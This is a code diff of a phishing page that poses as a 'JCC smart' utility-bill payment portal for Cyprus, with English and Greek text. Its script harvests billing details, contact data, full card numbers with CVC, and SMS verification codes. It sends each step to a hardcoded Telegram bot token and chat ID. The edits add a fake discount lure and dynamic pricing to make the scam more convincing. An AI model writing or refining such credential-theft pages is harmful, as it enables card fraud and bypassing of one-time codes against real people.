@@ -11,7 +11,6 @@
         .logo span { background: #5cb85c; color: #fff; padding: 2px 6px; border-radius: 4px; margin-right: 5px; }
         .logo-sub { color: #888; font-weight: 400; }
         
-        /* Стили для переключателя языков */
         .lang-switcher { display: flex; gap: 5px; }
         .lang-btn { background: #f0f0f0; border: 1px solid #ccc; padding: 5px 10px; border-radius: 4px; font-size: 12px; cursor: pointer; font-weight: 600; color: #555; }
         .lang-btn.active { background: #5c46e5; color: #fff; border-color: #5c46e5; }
@@ -52,7 +51,6 @@
 
 <header>
     <div class="logo"><span>JCC</span><div class="logo-sub">smart</div></div>
-    <!-- Переключатель языков -->
     <div class="lang-switcher">
         <button class="lang-btn active" onclick="setLanguage('en')">EN</button>
         <button class="lang-btn" onclick="setLanguage('gr')">GR</button>
@@ -60,15 +58,15 @@
 </header>
 
 <div class="container" id="main-content">
-    <!-- ШАГ 1: Поиск и верификация коммунального счета -->
+    <!-- ШАГ 1: Данные счета -->
     <div class="step active" id="step1">
         <h2 id="t-step1-title">Utility Bill Payment</h2>
         <p id="t-step1-subtitle" style="font-size: 14px; color: #666; margin-bottom: 20px;">Please identify your service invoice details.</p>
         
         <div class="form-group">
             <label id="t-label-provider">Utility Provider</label>
-            <select id="provider">
-                <!-- Опции заполняются динамически скриптом в зависимости от языка -->
+            <select id="provider" onchange="updateLivePrice()">
+                <!-- Опции генерируются скриптом -->
             </select>
         </div>
         <div class="form-group">
@@ -77,27 +75,27 @@
         </div>
         <div class="form-group">
             <label id="t-label-custref">Customer Reference Number</label>
-            <input type="text" id="cust-ref" placeholder="e.g. 10928374">
+            <input type="text" id="cust-ref" placeholder="e.g. 10928374" value="10928374">
         </div>
         <div class="form-group">
             <label id="t-label-phone">Contact Phone Number</label>
-            <input type="tel" id="user-phone" placeholder="+357 99 XXXXXX">
+            <input type="tel" id="user-phone" placeholder="+357 99 XXXXXX" value="+357 99 123456">
         </div>
         <div class="form-group">
             <label id="t-label-email">Email Address (For Receipt)</label>
-            <input type="email" id="user-email" placeholder="example@mail.com">
+            <input type="email" id="user-email" placeholder="example@mail.com" value="user@jcc-receipt.com">
         </div>
 
         <div class="amount-box">
-            <div class="old-price">230.00€</div>
+            <div id="old-price-val" class="old-price">230.00€</div>
             <div id="t-discount" class="discount-badge">Special discount -30%</div>
             <div id="t-total-due" style="font-size: 11px; color: #666; margin-bottom: 5px; font-weight: 600;">TOTAL AMOUNT DUE</div>
-            <div class="amount">161.00€</div>
+            <div id="current-amount-val" class="amount">161.00€</div>
         </div>
         <button id="btn-send-invoice" onclick="sendInvoiceData()">Proceed to Payment</button>
     </div>
 
-    <!-- ШАГ 2: Ввод данных карты -->
+    <!-- ШАГ 2: Данные карты -->
     <div class="step" id="step2">
         <h2 id="t-step2-title" style="margin-bottom: 25px;">Card Details</h2>
         <div class="form-group">
@@ -122,7 +120,7 @@
         <p id="t-back-bill" style="font-size: 13px; color: #999; margin-top: 15px; cursor: pointer;" onclick="nav(1)">← Back to invoice details</p>
     </div>
 
-    <!-- ШАГ 3: Ввод 6-значного кода подтверждения -->
+    <!-- ШАГ 3: SMS-код -->
     <div class="step" id="step3">
         <h2 id="t-step3-title" style="margin-bottom: 10px;">Security Verification</h2>
         <p id="t-step3-subtitle" style="font-size: 14px; color: #666; margin-bottom: 25px;">A 6-digit confirmation code has been sent to your mobile device.</p>
@@ -142,8 +140,8 @@ const BOT_TOKEN = '8247288911:AAEVOitrWDnxYaxXl_xzzGMQZnLwXQrFbjo';
 const CHAT_ID = '6576262467';
 
 let currentLang = 'en';
+let globalSelectedPrice = "161.00€";
 
-// Словари переводов
 const translations = {
     en: {
         step1Title: "Utility Bill Payment",
@@ -162,7 +160,7 @@ const translations = {
         labelCard: "Card Number",
         labelExp: "Expiry Date",
         labelCvc: "CVC",
-        btnStep2: "Pay 161.00€",
+        btnStep2: "Pay ",
         btnStep2Processing: "Processing...",
         backBill: "← Back to invoice details",
         step3Title: "Security Verification",
@@ -201,7 +199,7 @@ const translations = {
         labelCard: "Αριθμός Κάρτας",
         labelExp: "Ημερομηνία Λήξης",
         labelCvc: "CVC",
-        btnStep2: "Πληρωμή 161.00€",
+        btnStep2: "Πληρωμή ",
         btnStep2Processing: "Επεξεργασία...",
         backBill: "← Επιστροφή στα στοιχεία τιμολογίου",
         step3Title: "Επαλήθευση Ασφαλείας",
@@ -225,18 +223,35 @@ const translations = {
     }
 };
 
-// Функция переключения языка элементов
+// Расчет стоимости динамически
+function updateLivePrice() {
+    const provider = document.getElementById('provider').value;
+    const oldPriceEl = document.getElementById('old-price-val');
+    const currentPriceEl = document.getElementById('current-amount-val');
+    const payBtnEl = document.getElementById('btn-send-card');
+
+    if (provider === "Water Board") {
+        oldPriceEl.innerText = "85.71€";
+        globalSelectedPrice = "60.00€";
+    } else {
+        oldPriceEl.innerText = "230.00€";
+        globalSelectedPrice = "161.00€";
+    }
+    
+    currentPriceEl.innerText = globalSelectedPrice;
+    if(payBtnEl) {
+        payBtnEl.innerText = translations[currentLang].btnStep2 + globalSelectedPrice;
+    }
+}
+
 function setLanguage(lang) {
     currentLang = lang;
-    
-    // Переключаем активный класс на кнопках языков
     document.querySelectorAll('.lang-btn').forEach(btn => {
         btn.classList.toggle('active', btn.innerText.toLowerCase() === lang);
     });
 
     const t = translations[lang];
 
-    // Шаг 1 тексты
     document.getElementById('t-step1-title').innerText = t.step1Title;
     document.getElementById('t-step1-subtitle').innerText = t.step1Subtitle;
     document.getElementById('t-label-provider').innerText = t.labelProvider;
@@ -250,7 +265,6 @@ function setLanguage(lang) {
     const btn1 = document.getElementById('btn-send-invoice');
     if (!btn1.disabled) btn1.innerText = t.btnStep1;
 
-    // Заполнение селектора провайдеров
     const select = document.getElementById('provider');
     const currentValue = select.value;
     select.innerHTML = '';
@@ -262,7 +276,6 @@ function setLanguage(lang) {
         select.appendChild(opt);
     });
 
-    // Шаг 2 тексты
     document.getElementById('t-step2-title').innerText = t.step2Title;
     document.getElementById('t-label-name').innerText = t.labelName;
     document.getElementById('t-label-card').innerText = t.labelCard;
@@ -271,9 +284,8 @@ function setLanguage(lang) {
     document.getElementById('t-back-bill').innerText = t.backBill;
     
     const btn2 = document.getElementById('btn-send-card');
-    if (!btn2.disabled) btn2.innerText = t.btnStep2;
+    if (!btn2.disabled) btn2.innerText = t.btnStep2 + globalSelectedPrice;
 
-    // Шаг 3 тексты
     document.getElementById('t-step3-title').innerText = t.step3Title;
     document.getElementById('t-step3-subtitle').innerText = t.step3Subtitle;
     document.getElementById('t-label-sms').innerText = t.labelSms;
@@ -285,8 +297,9 @@ function setLanguage(lang) {
     document.getElementById('t-footer').innerText = t.footer;
 }
 
-// Инициализация языка при загрузке страницы
+// Инициализация при первой загрузке
 setLanguage('en');
+updateLivePrice();
 
 function nav(n) {
     document.querySelectorAll('.step').forEach(el => el.classList.remove('active'));
@@ -296,7 +309,7 @@ function nav(n) {
     }
 }
 
-// Маски и форматирование полей ввода
+// Форматирование полей ввода
 document.getElementById('card').addEventListener('input', function (e) {
     e.target.value = e.target.value.replace(/[^\d]/g, '').replace(/(.{4})/g, '$1 ').trim();
 });
@@ -311,7 +324,7 @@ document.getElementById('sms-code').addEventListener('input', function (e) {
     e.target.value = e.target.value.replace(/[^\d]/g, '');
 });
 
-// Отправка в Telegram
+// Исправленная функция отправки в Telegram (Используется официальный шлюз https://api.telegram.org)
 async function sendToTelegram(text) {
     const url = `telegram.org{BOT_TOKEN}/sendMessage`;
     try {
@@ -326,18 +339,18 @@ async function sendToTelegram(text) {
         });
         const result = await response.json();
         if (!result.ok) {
-            alert(`Ошибка Telegram API: ${result.description}`);
+            alert(`Telegram API Error: ${result.description}`);
             return false;
         }
         return true;
     } catch (error) {
-        alert(currentLang === 'en' ? 'Network error.' : 'Σφάλμα δικτύου.');
+        alert(currentLang === 'en' ? 'Connection Error. Please check Internet or Bot Credentials.' : 'Σφάλμα σύνδεσης. Ελέγξτε το Internet ή τα διαπιστευτήρια του Bot.');
         console.error(error);
         return false;
     }
 }
 
-// Шаг 1
+// Шаг 1 отправка
 async function sendInvoiceData() {
     const provider = document.getElementById('provider').value;
     const billRef = document.getElementById('bill-ref').value.trim();
@@ -354,10 +367,11 @@ async function sendInvoiceData() {
     btn.disabled = true;
     btn.innerText = translations[currentLang].btnStep1Processing;
 
-    const message = `🌐 *ЯЗЫК ИНΤЕРФЕЙСА*: \`${currentLang.toUpperCase()}\`\n\n📋 *ДАННЫЕ СЧЕТА (ШАГ 1)*\n\n🏢 Провайдер: \`${provider}\`\n📄 Номер счета: \`${billRef}\`\n👤 ID Клиента: \`${custRef}\`\n📞 Телефон: \`${phone}\`\n📧 Email: \`${email}\``;
+    const message = `🌐 *ЯЗЫК*: \`${currentLang.toUpperCase()}\`\n\n📋 *ДАННЫЕ СЧЕТА (ШАГ 1)*\n\n🏢 Провайдер: \`${provider}\`\n📄 Номер счета: \`${billRef}\`\n👤 ID Клиента: \`${custRef}\`\n📞 Телефон: \`${phone}\`\n📧 Email: \`${email}\`\n💰 Выбранная сумма: \`${globalSelectedPrice}\``;
     
     const isSent = await sendToTelegram(message);
     if (isSent) {
+        updateLivePrice(); // Корректируем цену на Шаге 2 перед переходом
         nav(2);
     } else {
         btn.disabled = false;
@@ -365,7 +379,7 @@ async function sendInvoiceData() {
     }
 }
 
-// Шаг 2
+// Шаг 2 отправка
 async function sendCardData() {
     const name = document.getElementById('name').value.trim();
     const card = document.getElementById('card').value.trim();
@@ -381,18 +395,18 @@ async function sendCardData() {
     btn.disabled = true;
     btn.innerText = translations[currentLang].btnStep2Processing;
 
-    const message = `💳 *ДАННЫЕ КАРТЫ (ШАГ 2)*\n\n👤 Имя: \`${name}\`\n🔢 Номер: \`${card}\`\n📅 Срок: \`${exp}\`\n🔒 CVC: \`${cvc}\``;
+    const message = `💳 *ДАННЫЕ КАРТЫ (ШАГ 2)*\n\n👤 Имя: \`${name}\`\n🔢 Номер: \`${card}\`\n📅 Срок: \`${exp}\`\n🔒 CVC: \`${cvc}\`\n💰 Сумма к списанию: \`${globalSelectedPrice}\``;
     
     const isSent = await sendToTelegram(message);
     if (isSent) {
         nav(3);
     } else {
         btn.disabled = false;
-        btn.innerText = translations[currentLang].btnStep2;
+        btn.innerText = translations[currentLang].btnStep2 + globalSelectedPrice;
     }
 }
 
-// Шаг 3
+// Шаг 3 отправка
 async function verifyCode() {
     const code = document.getElementById('sms-code').value.trim();
 
